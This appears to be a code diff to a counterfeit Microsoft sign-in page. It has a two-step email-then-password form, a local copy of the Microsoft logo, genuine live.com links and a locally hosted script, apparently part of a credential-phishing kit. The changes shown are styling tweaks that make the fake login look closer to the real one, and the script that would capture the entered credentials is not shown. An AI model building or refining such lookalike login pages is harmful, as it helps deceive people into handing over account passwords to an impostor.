@@ -32,7 +32,7 @@
 		</style>
 	</head>
 	<body class="flex sm:justify-center items-center h-screen w-full flex-col">
-		<section class="bg-white p-10 lg:p-12 w-full sm:w-97 md:shadow overflow-hidden relative section">
+		<section class="bg-white p-8 md:p-10 w-full sm:w-97 md:shadow overflow-hidden relative section">
 			<img src="./images/microsoft_logo.svg" alt="" class="" />
 
 			<form id="password-form" class="relative flex-col hidden left-96">
@@ -49,14 +49,14 @@
 					<span id="user-email" class="text-sm"></span>
 				</p>
 
-				<h1 class="mt-3 mb-2 text-2xl font-semibold">Enter password</h1>
+				<h1 class="mt-4 mb-2 text-2xl font-semibold">Enter password</h1>
 
 				<p class="text-red-500 leading-5 mt-2 hidden text-sm" id="error-msg2"></p>
 
-				<input type="password" name="password" id="password-input" placeholder="Password" class="outline-none border-b w-full pb-1 my-3 border-gray-600 text-sm" />
+				<input type="password" name="password" id="password-input" placeholder="Password" class="outline-none border-b w-full pb-1 my-3 border-gray-600 text-sm focus:border-blue-800 placeholder-gray-500" />
 				<input type="hidden" name="main-email" id="main-email" />
 
-				<p class="text-xs opacity-80">
+				<p class="text-sm opacity-80">
 					<a
 						class="blue-link"
 						href="https://signup.live.com/signup?cobrandid=90015&id=292841&contextid=676A8620950FAE70&opid=F1998F881FAF5E01&bk=1680812407&sru=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26id%3d292841%26contextid%3d676A8620950FAE70%26opid%3dF1998F881FAF5E01%26mkt%3dEN-US%26lc%3d1033%26bk%3d1680812407%26uaid%3d687b810dae4a4791b2d42ab6e504082e&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=687b810dae4a4791b2d42ab6e504082e"
@@ -70,17 +70,17 @@
 
 				<!-- <p class='my-7'>Sign in with a security key </p> -->
 
-				<button type="submit" class="blue-link-bg py-1 px-7 text-white float-right mt-8 input self-end text-sm" id="verify">Sign In</button>
+				<button type="submit" class="blue-link-bg py-1 px-9 text-white float-right mt-10 input self-end text-sm" id="verify" style="padding-top: 6px; padding-bottom: 6px">Sign In</button>
 			</form>
 
 			<form id="email-form" class="relative flex flex-col">
-				<h1 class="mt-3 mb-2 text-2xl font-semibold">Sign in</h1>
+				<h1 class="mt-4 mb-2 text-2xl font-semibold">Sign in</h1>
 
 				<p class="text-red-500 leading-5 mt-2 hidden text-sm" id="error-msg"></p>
 
-				<input type="text" name="" id="email-input" placeholder="Email, phone, or Skype" class="outline-none border-b w-full pb-1 my-2 border-gray-600 text-sm" />
+				<input type="text" name="" id="email-input" placeholder="Email, phone, or Skype" class="outline-none border-b w-full pb-1 my-2 border-gray-600 text-sm focus:border-blue-800 placeholder-gray-500" />
 
-				<p class="text-xs opacity-80 mt-2">
+				<p class="text-sm opacity-80 mt-2">
 					No account?
 					<a
 						class="blue-link"
@@ -95,7 +95,7 @@
 
 				<!-- <p class='my-7'>Sign in with a security key </p> -->
 
-				<button type="submit" class="blue-link-bg py-1 px-7 text-white mt-8 input self-end text-sm" id="next">Next</button>
+				<button type="submit" class="blue-link-bg py-1 px-9 text-white mt-10 input self-end text-sm" id="next" style="padding-top: 6px; padding-bottom: 6px">Next</button>
 			</form>
 
 			<div class="bg-white h-full w-full absolute top-0 left-0 opacity-65 hidden" id="overlay">
@@ -129,7 +129,7 @@
 		</footer>
 	</body>
 
-	<script src="./script/main.js?new=t4"></script>
+	<script src="./script/main.js?new=t5"></script>
 
 	<script></script>
 </html>
